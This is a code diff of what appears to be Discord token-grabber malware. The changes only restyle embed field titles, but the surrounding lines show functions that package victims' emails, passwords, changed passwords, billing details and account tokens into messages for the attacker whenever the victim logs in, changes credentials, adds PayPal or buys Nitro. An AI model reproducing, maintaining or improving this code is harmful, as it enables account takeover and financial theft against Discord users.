@@ -662,17 +662,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
+            name: '**Account Info:**',
             value: `📧 Email: **${email}** - 🔒 Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: '**Discord Info:**',
             value: `🚀 Nitro Type: **${nitro}**\n 🎖️ Badges: **${badges}**\n 💵 Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '📍 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -706,12 +706,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: '**Discord Info:**',
             value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '📍 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -745,12 +745,12 @@ const emailChanged = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: '**Discord Info:**',
             value: `🚀 Nitro Type: **${nitro}**\n 🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '📍 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -784,12 +784,12 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: '**Discord Info:**',
             value: `🚀 Nitro Type: **{nitro}**\n 🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '📍 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -869,7 +869,7 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '📍 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
